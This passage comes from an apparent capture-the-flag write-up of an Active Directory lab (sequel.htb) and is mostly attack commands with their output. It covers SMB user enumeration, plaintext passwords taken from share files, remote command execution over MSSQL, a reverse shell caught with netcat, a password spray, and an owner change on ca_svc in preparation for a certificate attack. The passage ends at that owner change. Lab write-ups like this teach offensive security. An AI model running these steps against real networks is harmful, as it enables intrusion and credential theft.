+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali: /home/kali/Documents
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># proxychains -q netexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su -d sequel.htb --users --rid-brute --shares                                        [19:22:05]</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [+] sequel.htb<span style="color:#ed9d13">\r</span>ose:KxEPkKe6R8su 
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             Accounting Department READ            
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             NETLOGON        READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             SYSVOL          READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             Users           READ            
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                    
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             Administrator                 2024-06-08 16:32:20 <span style="color:#3677a9">1</span>       Built-in account <span style="color:#6ab825;font-weight:bold">for</span> administering the computer/domain                                                                                                                          
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             Guest                         2024-12-25 14:44:53 <span style="color:#3677a9">0</span>       Built-in account <span style="color:#6ab825;font-weight:bold">for</span> guest access to the computer/domain                                                                                                                        
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             krbtgt                        2024-06-08 16:40:23 <span style="color:#3677a9">0</span>       Key Distribution Center Service Account                                                                                                                                         
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             michael                       2024-06-08 16:47:37 <span style="color:#3677a9">0</span>        
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             ryan                          2024-06-08 16:55:45 <span style="color:#3677a9">0</span>        
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             oscar                         2024-06-08 16:56:36 <span style="color:#3677a9">0</span>        
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             sql_svc                       2024-06-09 07:58:42 <span style="color:#3677a9">0</span>        
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             rose                          2024-12-25 14:44:54 <span style="color:#3677a9">0</span>        
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             ca_svc                        2025-03-09 00:22:29 <span style="color:#3677a9">0</span>        
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Enumerated <span style="color:#3677a9">9</span> <span style="color:#24909d">local</span> users: SEQUEL
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             498: SEQUEL<span style="color:#ed9d13">\E</span>nterprise Read-only Domain Controllers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             500: SEQUEL<span style="color:#ed9d13">\A</span>dministrator (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             501: SEQUEL<span style="color:#ed9d13">\G</span>uest (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             502: SEQUEL<span style="color:#ed9d13">\k</span>rbtgt (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             512: SEQUEL<span style="color:#ed9d13">\D</span>omain Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             513: SEQUEL<span style="color:#ed9d13">\D</span>omain Users (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             514: SEQUEL<span style="color:#ed9d13">\D</span>omain Guests (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             515: SEQUEL<span style="color:#ed9d13">\D</span>omain Computers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             516: SEQUEL<span style="color:#ed9d13">\D</span>omain Controllers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             517: SEQUEL<span style="color:#ed9d13">\C</span>ert Publishers (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             518: SEQUEL<span style="color:#ed9d13">\S</span>chema Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             519: SEQUEL<span style="color:#ed9d13">\E</span>nterprise Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             520: SEQUEL<span style="color:#ed9d13">\G</span>roup Policy Creator Owners (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             521: SEQUEL<span style="color:#ed9d13">\R</span>ead-only Domain Controllers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             522: SEQUEL<span style="color:#ed9d13">\C</span>loneable Domain Controllers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             525: SEQUEL<span style="color:#ed9d13">\P</span>rotected Users (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             526: SEQUEL<span style="color:#ed9d13">\K</span>ey Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             527: SEQUEL<span style="color:#ed9d13">\E</span>nterprise Key Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             553: SEQUEL<span style="color:#ed9d13">\R</span>AS and IAS Servers (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             571: SEQUEL<span style="color:#ed9d13">\A</span>llowed RODC Password Replication Group (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             572: SEQUEL<span style="color:#ed9d13">\D</span>enied RODC Password Replication Group (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1000: SEQUEL<span style="color:#ed9d13">\D</span>C01$ (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1101: SEQUEL<span style="color:#ed9d13">\D</span>nsAdmins (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1102: SEQUEL<span style="color:#ed9d13">\D</span>nsUpdateProxy (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1103: SEQUEL<span style="color:#ed9d13">\m</span>ichael (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1114: SEQUEL<span style="color:#ed9d13">\r</span>yan (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1116: SEQUEL<span style="color:#ed9d13">\o</span>scar (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1122: SEQUEL<span style="color:#ed9d13">\s</span>ql_svc (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1128: SEQUEL<span style="color:#ed9d13">\S</span>QLServer2005SQLBrowserUser<span style="color:#40ffff">$DC01</span> (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1129: SEQUEL<span style="color:#ed9d13">\S</span>QLRUserGroupSQLEXPRESS (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1601: SEQUEL<span style="color:#ed9d13">\r</span>ose (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1602: SEQUEL<span style="color:#ed9d13">\M</span>anagement Department (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1603: SEQUEL<span style="color:#ed9d13">\S</span>ales Department (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1604: SEQUEL<span style="color:#ed9d13">\A</span>ccounting Department (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1605: SEQUEL<span style="color:#ed9d13">\R</span>eception Department (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1606: SEQUEL<span style="color:#ed9d13">\H</span>uman Resources Department (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1607: SEQUEL<span style="color:#ed9d13">\c</span>a_svc (SidTypeUser)
+</span></span></code></pre></div><p>we were able to discover other local and network users
+as well as an smb share containing some files</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali: <span style="color:#999;font-style:italic"># proxychains -q impacket-smbclient sequel.htb/rose:&#39;KxEPkKe6R8su&#39;@10.10.11.51                                                                           </span>
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#24909d">help</span> <span style="color:#6ab825;font-weight:bold">for</span> list of commands
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># shares</span>
+</span></span><span style="display:flex;"><span>Accounting Department
+</span></span><span style="display:flex;"><span>ADMIN$
+</span></span><span style="display:flex;"><span>C$
+</span></span><span style="display:flex;"><span>IPC$
+</span></span><span style="display:flex;"><span>NETLOGON
+</span></span><span style="display:flex;"><span>SYSVOL
+</span></span><span style="display:flex;"><span>Users
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># use Accounting Department</span>
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># ls</span>
+</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#3677a9">0</span>  Sun Jun  <span style="color:#3677a9">9</span> 07:11:31 <span style="color:#3677a9">2024</span> .
+</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#3677a9">0</span>  Sun Jun  <span style="color:#3677a9">9</span> 07:11:31 <span style="color:#3677a9">2024</span> ..
+</span></span><span style="display:flex;"><span>-rw-rw-rw-      <span style="color:#3677a9">10217</span>  Sun Jun  <span style="color:#3677a9">9</span> 07:11:31 <span style="color:#3677a9">2024</span> accounting_2024.xlsx
+</span></span><span style="display:flex;"><span>-rw-rw-rw-       <span style="color:#3677a9">6780</span>  Sun Jun  <span style="color:#3677a9">9</span> 07:11:31 <span style="color:#3677a9">2024</span> accounts.xlsx
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># get accounting_2024.xlsx</span>
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># get accounts.xlsx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>//by downloading to our machine we can see the contents of the files: 
+</span></span><span style="display:flex;"><span>Angela	Martin	      angela@sequel.htb	angela	0fwz7Q4mSpurIt99
+</span></span><span style="display:flex;"><span>Oscar	  Martinez	    oscar@sequel.htb	oscar	  86LxLBMgEWaKUnBG
+</span></span><span style="display:flex;"><span>Kevin	  Malone	      kevin@sequel.htb	kevin	  Md9Wlq1E5bZnVDVo 
+</span></span><span style="display:flex;"><span>  -	      -	          sa@sequel.htb	     sa	    MSSQLP@ssw0rd!
+</span></span></code></pre></div><p>We got some user passwords, and one from the <code>mssql</code> service.
+Now we will do a domain enumeration to help us know <code>Domain</code> settings.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>//  LDAP
+</span></span><span style="display:flex;"><span>$ ldapdomaindump -u sequel.htb<span style="color:#ed9d13">\\</span>rose -p <span style="color:#ed9d13">&#39;KxEPkKe6R8su&#39;</span> 10.10.11.51 -o ldap/                                                        
+</span></span><span style="display:flex;"><span>[*] Connecting to host...
+</span></span><span style="display:flex;"><span>[*] Binding to host
+</span></span><span style="display:flex;"><span>[+] Bind OK
+</span></span><span style="display:flex;"><span>[*] Starting domain dump
+</span></span><span style="display:flex;"><span>[+] Domain dump finished
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Bloodhound
+</span></span><span style="display:flex;"><span>bloodhound-python -u rose -p KxEPkKe6R8su -ns 10.10.11.51 -d sequel.htb -c All
+</span></span></code></pre></div><p><img alt="AD_Image_3" src="https://pwnbuffer.github.io/images/mount/ADxpl/ldap.png"></p>
+<p><img alt="domain" src="https://pwnbuffer.github.io/images/mount/ADxpl/domain.png"></p>
+<p>we can see the local and network users
+the only domain administrator account currently registered</p>
+<h2 id="testing-credentials">
+  Testing Credentials
+  <a class="heading-link" href="#testing-credentials">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>let&rsquo;s try authenticating with <a href="https://www.kali.org/tools/netexec/"  class="external-link" target="_blank" rel="noopener"><code>netexec</code></a> in <strong>mssql</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~$ proxychains -q netexec mssql 10.10.11.51 -u sa -p <span style="color:#ed9d13">&#39;MSSQLP@ssw0rd!&#39;</span> --local-auth                                                                  [16:53:09]
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> (name:DC01) (domain:sequel.htb)
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [+] DC01<span style="color:#ed9d13">\s</span>a:MSSQLP@ssw0rd! (Pwn3d!)
+</span></span></code></pre></div><p>See that <code>netexec</code> is marking the target as <em><strong>Pwn3d</strong></em> that means we can execute remote commands</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ netexec mssql 10.10.11.51 -u sa -p <span style="color:#ed9d13">&#39;MSSQLP@ssw0rd!&#39;</span> --local-auth -X <span style="color:#ed9d13">&#39;whoami ;net user&#39;</span>                                            [16:56:10]
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> (name:DC01) (domain:sequel.htb)
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [+] DC01<span style="color:#ed9d13">\s</span>a:MSSQLP@ssw0rd! (Pwn3d!)
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             [+] Executed <span style="color:#24909d">command</span> via mssqlexec
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             sequel<span style="color:#ed9d13">\s</span>ql_svc
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             User accounts <span style="color:#6ab825;font-weight:bold">for</span> <span style="color:#ed9d13">\\</span>DC01
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             -------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             Administrator            ca_svc                   Guest
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             krbtgt                   michael                  oscar
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             rose                     ryan                     sql_svc
+</span></span><span style="display:flex;"><span>MSSQL       10.10.11.51     <span style="color:#3677a9">1433</span>   DC01             The <span style="color:#24909d">command</span> completed successfully.
+</span></span></code></pre></div><p>let&rsquo;s scale this to a shell using <a href="https://en.wikipedia.org/wiki/Base64"  class="external-link" target="_blank" rel="noopener"><code>base64</code></a></p>
+<ul>
+<li>Here I used the <a href="https://revshells.com"  class="external-link" target="_blank" rel="noopener">revshells.com</a> site to generate the payload in base64.</li>
+</ul>
+<p><img alt="rev" src="https://pwnbuffer.github.io/images/mount/ADxpl/revshell.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> $ nc -lnvp <span style="color:#3677a9">1337</span>                   
+</span></span><span style="display:flex;"><span>listening on [<span style="color:#40ffff">any</span>] <span style="color:#3677a9">1337</span> ...
+</span></span><span style="display:flex;"><span>connect to [<span style="color:#3677a9">10.10</span>.15.<span style="color:#3677a9">6</span>] from (UNKNOWN) [<span style="color:#3677a9">10.10</span>.11.<span style="color:#3677a9">72</span>] <span style="color:#3677a9">58522</span>
+</span></span><span style="display:flex;"><span><span style="color:#24909d">PS </span>C:\Windows\system32&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State   
+</span></span><span style="display:flex;"><span>============================= ============================== ========
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Create global objects          Enabled 
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a <span style="color:#6ab825;font-weight:bold">process</span> working <span style="color:#24909d">set </span>Disabled
+</span></span></code></pre></div><h2 id="escalating-privileges">
+  Escalating privileges
+  <a class="heading-link" href="#escalating-privileges">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>looking at the files we see a server config file
+inside we can find the password <code>WqSZAF6CysDQbGb3</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#24909d">PS </span>C:\SQL2019\ExpressAdv_ENU&gt; <span style="color:#24909d">type sql-Configuration</span>.INI
+</span></span><span style="display:flex;"><span>[<span style="color:#40ffff">OPTIONS</span>]
+</span></span><span style="display:flex;"><span>ACTION=<span style="color:#ed9d13">&#34;Install&#34;</span>
+</span></span><span style="display:flex;"><span>QUIET=<span style="color:#ed9d13">&#34;True&#34;</span>
+</span></span><span style="display:flex;"><span>FEATURES=SQL
+</span></span><span style="display:flex;"><span>INSTANCENAME=<span style="color:#ed9d13">&#34;SQLEXPRESS&#34;</span>
+</span></span><span style="display:flex;"><span>INSTANCEID=<span style="color:#ed9d13">&#34;SQLEXPRESS&#34;</span>
+</span></span><span style="display:flex;"><span>RSSVCACCOUNT=<span style="color:#ed9d13">&#34;NT Service\ReportServer</span><span style="color:#40ffff">$SQLEXPRESS</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>AGTSVCACCOUNT=<span style="color:#ed9d13">&#34;NT AUTHORITY\NETWORK SERVICE&#34;</span>
+</span></span><span style="display:flex;"><span>AGTSVCSTARTUPTYPE=<span style="color:#ed9d13">&#34;Manual&#34;</span>
+</span></span><span style="display:flex;"><span>COMMFABRICPORT=<span style="color:#ed9d13">&#34;0&#34;</span>
+</span></span><span style="display:flex;"><span>COMMFABRICNETWORKLEVEL=<span style="color:#ed9d13">&#34;&#34;</span><span style="color:#3677a9">0</span><span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">COMMFABRICENCRYPTION=&#34;</span><span style="color:#3677a9">0</span><span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">MATRIXCMBRICKCOMMPORT=&#34;</span><span style="color:#3677a9">0</span><span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">SQLSVCSTARTUPTYPE=&#34;</span>Automatic<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">FILESTREAMLEVEL=&#34;</span><span style="color:#3677a9">0</span><span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">ENABLERANU=&#34;</span>False<span style="color:#ed9d13">&#34; 
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">SQLCOLLATION=&#34;</span>SQL_Latin1_General_CP1_CI_AS<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">SQLSVCACCOUNT=&#34;</span>SEQUEL\sql_svc<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">SQLSVCPASSWORD=&#34;</span>WqSZAF6CysDQbGb3<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">SQLSYSADMINACCOUNTS=&#34;</span>SEQUEL\Administrator<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">SECURITYMODE=&#34;</span>SQL<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">SAPWD=&#34;</span>MSSQLP<span style="color:#40ffff">@ssw0rd</span>!<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">ADDCURRENTUSERASSQLADMIN=&#34;</span>False<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">TCPENABLED=&#34;</span><span style="color:#3677a9">1</span><span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">NPENABLED=&#34;</span><span style="color:#3677a9">1</span><span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">BROWSERSVCSTARTUPTYPE=&#34;</span>Automatic<span style="color:#ed9d13">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13">IAcceptSQLServerLicenseTerms=True
+</span></span></span></code></pre></div><p>let&rsquo;s take the list of users we took and <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/password-spraying/"  class="external-link" target="_blank" rel="noopener">spray</a> that password</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~# kerbrute passwordspray  -d sequel.htb --dc 10.10.11.51 users.txt <span style="color:#ed9d13">&#34;WqSZAF6CysDQbGb3&#34;</span>      [17:19:29]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ed9d13">\/</span> ___/ __ <span style="color:#ed9d13">\/</span> ___/ / / / __/ _ <span style="color:#ed9d13">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ed9d13"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ed9d13">\_</span>__/_/  /_.___/_/   <span style="color:#ed9d13">\_</span>_,_/<span style="color:#ed9d13">\_</span>_/<span style="color:#ed9d13">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 (9dad6e1) - 03/10/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/03/10 17:19:46 &gt;  Using KDC(s):
+</span></span><span style="display:flex;"><span>2025/03/10 17:19:46 &gt;   10.10.11.51:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/03/10 17:19:47 &gt;  [+] VALID LOGIN:  sql_svc@sequel.htb:WqSZAF6CysDQbGb3
+</span></span><span style="display:flex;"><span>2025/03/10 17:19:47 &gt;  [+] VALID LOGIN:  ryan@sequel.htb:WqSZAF6CysDQbGb3
+</span></span><span style="display:flex;"><span>2025/03/10 17:19:47 &gt;  Done! Tested <span style="color:#3677a9">6</span> logins (<span style="color:#3677a9">2</span> successes) in 0.927 seconds
+</span></span></code></pre></div><p>ryan is part of the <code>Management Department</code> group within the domain</p>
+<p><img alt="map" src="https://pwnbuffer.github.io/images/mount/ADxpl/grupos-ryan.png"></p>
+<p>let&rsquo;s see what <code>permissions</code> it has</p>
+<p><img alt="map" src="https://pwnbuffer.github.io/images/mount/ADxpl/writeowner.png"></p>
+<p>and we can see that it has the <code>WriteOwner</code> attribute on a user called <code>CA_SVC</code>
+which means it can take possession of the object and launch a <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"  class="external-link" target="_blank" rel="noopener"><code>Shadow Credentials</code></a> attack.</p>
+<h2 id="exploring-miscofiguration">
+  Exploring Miscofiguration
+  <a class="heading-link" href="#exploring-miscofiguration">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Basically we&rsquo;re going to transfer the certificate attribute to the user ryan and exploit an <code>ActiveDirectory</code> vulnerability known as <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26923"  class="external-link" target="_blank" rel="noopener"><code>CVE-2022-26923</code></a> or <code>Certifried</code> in which we&rsquo;re going to create a certificate and extract hashes from <code>Domain Admin</code>.</p>
+<p><img alt="map" src="https://pwnbuffer.github.io/images/mount/ADxpl/cert.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali:~# bloodyAD --host <span style="color:#ed9d13">&#39;10.10.11.51&#39;</span> -d <span style="color:#ed9d13">&#39;sequel.htb&#39;</span> -u <span style="color:#ed9d13">&#39;ryan&#39;</span> -p <span style="color:#ed9d13">&#39;WqSZAF6CysDQbGb3&#39;</span> <span style="color:#24909d">set</span> owner <span style="color:#ed9d13">&#39;ca_svc&#39;</span> <span style="color:#ed9d13">&#39;ryan&#39;</span>
+</span></span><span style="display:flex;"><span>[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
+</span></span><span style="display:flex;"><span>
